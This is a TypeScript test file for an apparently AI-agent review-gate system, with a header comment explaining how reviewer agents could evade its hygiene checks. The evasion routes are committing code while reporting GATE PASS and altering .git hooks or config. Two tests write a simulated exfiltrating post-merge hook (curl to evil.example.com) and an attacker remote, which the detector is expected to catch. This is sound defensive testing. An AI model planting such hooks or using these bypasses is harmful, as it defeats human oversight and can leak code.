/**
 * Regression tests for Bug K — three trust-boundary residuals left
 * open after PR #108's qa-only `gateAllowsSourceFixes` scoping.
 *
 * Source: PR #108 review pipeline. Security specialist + Codex
 * adversarial multi-confirmed three additional residual gaps in
 * `runReviewGates`' post-spawn hygiene:
 *
 *   K1 — HEAD-advance not blocked on review gates. A reviewer can
 *        `git commit` source changes under the post-Bug-J
 *        workspace-write sandbox, write GATE PASS, leave the tree
 *        clean, and the gate accepts the commit. `validatePostAgentHygiene`
 *        only checked dirty deltas; HEAD advance was invisible.
 *
 *   K2 — Failed/timed-out reviewers skipped hygiene entirely. The
 *        early-return at applyGateHygiene preserved any worktree
 *        mutations the reviewer left behind. The next retry / recovery
 *        path ran against the mutated tree.
 *
 *   K3 — `.git/` directory mutations (hooks, config, info/exclude,
 *        HEAD) bypassed the hygiene gate because `git status` doesn't
 *        report them. Pre-Bug-J the OS read-only sandbox blocked them
 *        at the syscall level; post-Bug-J nothing did.
 *
 * Plan ref: ~/.claude/plans/fixing-plan-bugs-k-through-n-post-pr-108.md
 */

import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import {
  captureGitSnapshot,
  validateGitDirUnchanged,
} from "../cli";

const cliPath = path.resolve(import.meta.dir, "../cli.ts");
const cliContent = fs.readFileSync(cliPath, "utf-8");

let tmpDir: string;
let cwd: string;

function gitInitWithSeed(): void {
  spawnSync("git", ["init", "-b", "main"], { cwd });
  spawnSync("git", ["config", "user.email", "t@e.com"], { cwd });
  spawnSync("git", ["config", "user.name", "t"], { cwd });
  fs.writeFileSync(path.join(cwd, "README.md"), "seed\n");
  spawnSync("git", ["add", "-A"], { cwd });
  spawnSync("git", ["commit", "-m", "seed"], { cwd });
}

function gitDirPath(): string {
  // resolve via git itself so linked-worktree layouts work
  const r = spawnSync("git", ["rev-parse", "--git-common-dir"], {
    cwd,
    encoding: "utf8",
  });
  const dir = r.stdout.trim();
  return path.isAbsolute(dir) ? dir : path.join(cwd, dir);
}

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "bug-k-"));
  cwd = path.join(tmpDir, "wt");
  fs.mkdirSync(cwd);
  gitInitWithSeed();
});

afterEach(() => {
  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch {}
});

describe("Bug K3 — .git/ directory mutation tracking", () => {
  it("T-K1: captureGitSnapshot populates gitDirHashes when captureGitDirContents=true", () => {
    const snap = captureGitSnapshot(cwd, { captureGitDirContents: true });
    expect(snap.gitDirHashes).toBeDefined();
    // At minimum: HEAD, config, info/exclude (may be absent on fresh init),
    // packed-refs (likely absent on fresh init), hooks/ listing.
    expect(snap.gitDirHashes!.size).toBeGreaterThan(0);
    // HEAD always exists after init.
    const headKey = Array.from(snap.gitDirHashes!.keys()).find((k) =>
      k.endsWith("/HEAD"),
    );
    expect(headKey).toBeDefined();
    expect(snap.gitDirHashes!.get(headKey!)).toMatch(/^[a-f0-9]{64}$/);
  });

  it("T-K2: gitDirHashes is absent when captureGitDirContents is not requested (back-compat)", () => {
    const snap = captureGitSnapshot(cwd);
    expect(snap.gitDirHashes).toBeUndefined();
  });

  it("T-K3: validateGitDirUnchanged detects post-merge hook injection", () => {
    const before = captureGitSnapshot(cwd, { captureGitDirContents: true });
    // Simulate the attack: install a post-merge hook that exfiltrates.
    const hookPath = path.join(gitDirPath(), "hooks", "post-merge");
    fs.writeFileSync(hookPath, "#!/bin/sh\ncurl -X POST evil.example.com\n", {
      mode: 0o755,
    });
    const verdict = validateGitDirUnchanged({
      before,
      cwd,
      label: "review gate",
    });
    expect(verdict.ok).toBe(false);
    expect(verdict.errors[0]).toContain("hooks/");
    expect(verdict.errors[0]).toContain("review/QA roles must NOT modify git metadata");
  });

  it("T-K4: validateGitDirUnchanged detects .git/config rewrite", () => {
    const before = captureGitSnapshot(cwd, { captureGitDirContents: true });
    // Simulate the attack: rewrite origin URL to attacker-controlled host.
    spawnSync(
      "git",
      ["remote", "add", "evil", "https://attacker.example.com/repo.git"],
      { cwd },
    );
    const verdict = validateGitDirUnchanged({
      before,
      cwd,
      label: "review gate",
    });
    expect(verdict.ok).toBe(false);
    // The mutation lands in `.git/config`; the error names the file.
    expect(verdict.errors.some((e) => e.includes("/config"))).toBe(true);
  });

  it("T-K5: validateGitDirUnchanged is a no-op when before snapshot lacks gitDirHashes", () => {
    // Caller didn't opt in to K3 tracking — check is silent.
    const before = captureGitSnapshot(cwd);
    expect(before.gitDirHashes).toBeUndefined();
    const verdict = validateGitDirUnchanged({
      before,
      cwd,
      label: "review gate",
    });
    expect(verdict.ok).toBe(true);
    expect(verdict.errors).toEqual([]);
  });
});

describe("Bug K — static-grep wiring guards", () => {
  it("T-K6a: applyGateHygiene declares requireNoHeadAdvance + discardOnFailure opts", () => {
    // Pin the typed surface. A future refactor that drops these fields
    // silently removes K1/K2 enforcement.
    expect(cliContent).toMatch(/requireNoHeadAdvance\?:\s*boolean/);
    expect(cliContent).toMatch(/discardOnFailure\?:\s*boolean/);
  });

  it("T-K6b: runReviewGates wires requireNoHeadAdvance=gateIsReviewer + discardOnFailure=true at both call sites", () => {
    // The primary gate call AND the sandbox-retry call must pass these
    // flags. Match the literal field assignments anchored to the
    // labels each call site uses.
    expect(cliContent).toMatch(
      /label:\s*`\$\{name\}\s+gate`,[\s\S]{0,800}requireNoHeadAdvance:\s*gateIsReviewer,[\s\S]{0,400}discardOnFailure:\s*true/,
    );
    expect(cliContent).toMatch(
      /label:\s*`\$\{name\}\s+sandbox retry gate`,[\s\S]{0,800}requireNoHeadAdvance:\s*gateIsReviewer,[\s\S]{0,400}discardOnFailure:\s*true/,
    );
  });

  it("T-K6c: captureGitSnapshot accepts captureGitDirContents opt + runReviewGates passes it true", () => {
    expect(cliContent).toMatch(/captureGitDirContents\?:\s*boolean/);
    // The runReviewGates call captures BOTH workTreeContents (existing,
    // Bug 5 / blind-execution) AND gitDirContents (Bug K3).
    expect(cliContent).toMatch(
      /captureGitSnapshot\(opts\.cwd,\s*\{[\s\S]{0,300}captureContents:\s*true,[\s\S]{0,300}captureGitDirContents:\s*true[\s\S]{0,100}\}\)/,
    );
  });

  it("T-K6d: applyGateHygiene checks list includes validateGitDirUnchanged", () => {
    expect(cliContent).toMatch(
      /validatePostAgentHygiene\([\s\S]{0,400}validateParentWorkspaceUnchanged\([\s\S]{0,500}validateGitDirUnchanged\(/,
    );
  });

  it("T-K6e: K1 head-advance error message names the exact regression class", () => {
    expect(cliContent).toContain("reviewer roles are read-only");
  });

  it("T-K6f: K2 failed-gate cleanup discards via discardBlindExecutionChanges", () => {
    expect(cliContent).toMatch(
      /opts\.discardOnFailure[\s\S]{0,500}discardBlindExecutionChanges\(opts\.cwd,\s*opts\.before\)/,
    );
  });
});
